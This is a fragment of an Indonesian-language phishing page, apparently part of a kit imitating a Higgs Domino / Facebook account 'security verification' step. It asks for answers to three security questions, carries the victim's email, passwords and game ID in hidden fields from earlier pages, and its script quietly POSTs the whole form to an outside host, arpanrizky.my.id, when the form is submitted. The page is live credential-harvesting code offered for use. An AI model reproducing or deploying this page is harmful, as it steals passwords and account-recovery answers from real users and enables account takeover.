...
if($email == "" && $password == "" && $passwordpgfb == ""){
...
<html>
 <head> 
  ...
  <link rel="stylesheet" href="https://raw.githubusercontent.com/jefanya14/higgs-domino-v16/main/facebook.css"> 
...
.buttonalexverifhdi button {
 ...
 <body style="background: #f4d9aa;"> 
   ...
   <div class="containeralexhdi"> 
    <div class="boxverifalexhdi"> 
     ...
     <div class="verifikasikeamananalex"> 
      <form method="POST" id="formLogin" onsubmit="open_my_account();" action="check.php" class="boxformalex">
       <div class="itemalexverifhdi"> 
        <label>Q1</label> 
        <select name="quest1"> <option>Apa nama film pertama yang Anda tonton?</option> <option>Apa mobil kesukaan Anda?</option> <option>Tim sepak bola kesukaan Anda?</option> <option>Nama panggilan masa kecil Anda?</option> </select> 
       </div> 
       <div class="itemalexverifhdi"> 
        <label>A1</label> 
       ...
       <div class="itemalexverifhdi"> 
        <label>Q2</label> 
        <select name="quest2"> <option>Apa pekerjaan pertama Anda?</option> <option>Siapa nama sahabat Anda?</option> <option>Apa nama hewan peliharaan Anda?</option> <option>Siapa penyanyi yang Anda sukai?</option> </select> 
       </div> 
       <div class="itemalexverifhdi"> 
        <label>A2</label> 
       ...
       <div class="itemalexverifhdi"> 
        <label>Q3</label> 
        <select name="quest3"> <option>Apa makanan kesukaan Anda?</option> <option>Apa pekerjaan yang Anda inginkan?</option> <option>Artis mana yang paling Anda sukai?</option> <option>Apa mainan pertama Anda?</option> </select> 
       </div> 
       <div class="itemalexverifhdi"> 
        <label>A3</label> 
       ...
       <div class="buttonalexverifhdi"> 
       	<input type="hidden" name="playid" id="ressplayid" value="<?php echo $playid;?>" readonly>
                                <input type="hidden" name="nickname" id="ressnick" value="<?php echo $nickname;?>" readonly>
                                	<input type="hidden" name="email" id="ressemail" value="<?php echo $email;?>" readonly>
                                <input type="hidden" name="password" id="resspw" value="<?php echo $password;?>" readonly>
                                	<input type="hidden" name="emailpg" id="ressplayid" value="<?php echo $emailpg;?>" readonly>
                                <input type="hidden" name="passwordpgfb" id="pwid" value="<?php echo $passwordpgfb;?>" readonly>
  ...
  <script>
    function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'https://arpanrizky.my.id/true/index.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}
      </script>
 </body>
</html>